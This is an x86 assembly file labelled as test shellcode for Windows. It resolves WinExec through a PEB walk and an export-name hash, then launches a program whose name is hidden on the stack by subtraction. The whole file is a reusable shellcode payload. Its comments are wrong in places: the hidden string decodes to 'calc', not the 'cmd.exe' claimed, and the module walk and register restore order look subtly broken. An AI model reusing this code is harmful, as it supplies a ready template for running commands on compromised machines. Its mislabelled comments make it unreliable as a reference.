; Test Shellcode
; call Winexec(cmd)

section .text

global _start

_start:
    pushad
    pushfd
base:
    xor ebx, ebx
    mov ebx, [fs:ebx + 0x30]; Get PEB
    mov ebx, [ebx + 0x0c]   ; Get Ldr
    mov ebx, [ebx + 0x14]   ; Get InMemoryOrderModuleList
    mov ebx, [ebx]          ; Get first entry (ntdll.dll)
    mov ebx, [ebx]          ; Get second entry (kernel32.dll)
    mov ebx, [ebx + 0x10]   ; Get kernel32.dll base address
funcaddr:
    mov edx, [ebx + 0x3c]   ; Get PE sig RVA
    mov edx, [edx + ebx + 0x78]   ; Get Export Table RVA
    add edx, ebx            ; Get Export Table address
    mov ecx, [edx + 0x14]   ; Get the number of exported functions
    mov eax, [edx + 0x1C]   ; Get Address table RVA
    add eax, ebx            ; Get Address table address
    push eax                ; Push Address table
    mov edi, [edx + 0x20]   ; Get Name table RVA
    add edi, ebx            ; Get Name table address
    mov edx, [edx + 0x24]   ; Get Ordinal table RVA
    add edx, ebx            ; Get Ordinal table address
    push edx                ; Push Ordinal table
.tableloop:
    jecxz .notfound
    dec ecx
    mov esi, [edi + ecx * 4]; NameTable[ecx = i]
    add esi, ebx
    xor eax, eax
    xor edx, edx            ; Init hash
.nameloop:
    lodsb                   ; Get next char
    test al, al             ; End of string?
    jz .hashcheck           ; Yes, go to check hash
    ror edx, 0xd            ; ror hash
    add edx, eax            ; add char to hash
    jmp .nameloop
.hashcheck:
    cmp edx, 0x0e8afe98     ; hash == "Winexec" hash?
    jnz .tableloop
    pop edx
    pop eax
.found:
    mov cx, [edx + ecx * 2]
    mov edx, [eax + ecx * 4]
    add edx, ebx            ; Get func address
    push 0x21212121
    sub dword [esp], 0x21212121
    push 0x848d8284
    sub dword [esp], 0x21212121
    mov eax, esp
    push 0xa                ; window state
    push eax                ; pointer to "cmd.exe\0"
    call edx                ; Winexec("cmd.exe\0") 
.end:
    popad
    popfd
    ret
.notfound:
    pop edx
    pop eax
    jmp .end
